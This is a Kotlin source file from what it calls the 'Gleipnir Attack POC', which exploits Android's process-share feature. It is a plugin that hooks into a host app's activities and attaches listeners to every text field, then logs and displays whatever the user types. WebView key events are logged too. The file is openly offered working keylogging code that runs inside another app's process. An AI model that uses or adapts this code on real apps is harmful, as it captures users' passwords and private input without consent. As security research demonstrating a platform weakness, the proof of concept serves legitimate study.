/*
 * Gleipnir Attack POC - Exploiting the Android process share feature
 * Copyright (C) <2020>  <Sascha Roth>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

package org.gleipnir.app.plugins

import android.app.Activity
import android.app.Application
import android.text.Editable
import android.text.TextWatcher
import android.view.View
import android.view.ViewGroup
import android.webkit.WebView
import android.widget.TextView
import android.widget.Toast
import org.gleipnir.app.extendableLoader.ApplicationPaths
import org.gleipnir.app.extendableLoader.IPlugin
import org.gleipnir.app.extendableLoader.LoaderContext
import org.gleipnir.app.extendableLoader.log

class Input2Toast : IPlugin {
    override fun description(): String {
        return "Input2Toast"
    }

    override fun onBindApp(loaderContext: LoaderContext): Boolean {
        return false
    }

    override fun onPrepareClassLoader(loaderContext: LoaderContext, classLoader: ClassLoader) {
    }

    override fun onCreateApplication(loaderContext: LoaderContext, application: Application) {
    }

    override fun onLaunchMainActivity(loaderContext: LoaderContext) {
    }

    override fun onNewActivity(loaderContext: LoaderContext, activity: Activity) {
    }

    override fun onPreCreateActivity(loaderContext: LoaderContext, activity: Activity) {

    }

    override fun onPostCreateActivity(loaderContext: LoaderContext, activity: Activity) {
        installListener(activity)
    }

    override fun onError(loaderContext: LoaderContext, exception: Exception) {
    }

    override fun onCreatePaths(loaderContext: LoaderContext, paths: ApplicationPaths): Boolean {
        return false
    }

    fun installListener(activity: Activity) {
        log("Input2Toast [-] install listener")

        setAccessibilityListenerRecursive(activity.window.decorView)
        activity.window.decorView.addOnLayoutChangeListener { v, left, top, right, bottom,
                                                              oldLeft, oldTop, oldRight, oldBottom ->
            setAccessibilityListenerRecursive(activity.window.decorView)

        }
    }

    fun setAccessibilityListenerRecursive(view: View) {
        if (view is ViewGroup) {
            for (i in 0 until view.childCount) {
                val v = view.getChildAt(i)
                setAccessibilityListenerRecursive(v)
            }
        }
        log("Input2Toast [-] add text changed listener")
        if (view is TextView) {
            view.addTextChangedListener(object : TextWatcher {
                override fun afterTextChanged(s: Editable?) {

                }

                override fun beforeTextChanged(
                    s: CharSequence?,
                    start: Int,
                    count: Int,
                    after: Int
                ) {
                }

                override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {
                    log("Input2Toast [-] text changed $s")
                    Toast.makeText(view.context, s, Toast.LENGTH_SHORT).show()
                }

            })
        } else if (view is WebView) {
            view.setOnKeyListener { v, keyCode, event ->
                log("Input2Toast [-] key event $event")
                false
            }
        }
    }
}